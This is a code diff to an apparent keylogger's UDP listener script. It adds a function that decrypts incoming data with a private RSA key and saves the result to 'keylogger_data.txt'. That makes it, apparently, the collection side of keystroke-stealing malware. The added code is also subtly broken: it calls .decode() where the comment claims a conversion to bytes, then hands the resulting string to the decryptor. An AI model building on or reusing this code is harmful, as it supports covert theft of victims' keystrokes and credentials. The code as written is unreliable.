@@ -1,5 +1,22 @@
 import socket
 from requests import get
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
+
+
+# decrypts input string using our private key
+def decrypt(ciphertext):
+    # convert string to bytes object
+    data = ciphertext.decode()
+
+    # Read private key
+    pkey = RSA.importKey(open('private.pem').read())
+    cipher2 = PKCS1_OAEP.new(pkey)
+    result = cipher2.decrypt(data)
+    outfile = open("./keylogger_data.txt", "w")  # save decryption to file
+    outfile.write(result.decode("utf-8"))
+    print(result)  # print decryption
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -26,3 +43,5 @@ while True:
             print(msg)
     else:
         exit()
+
+
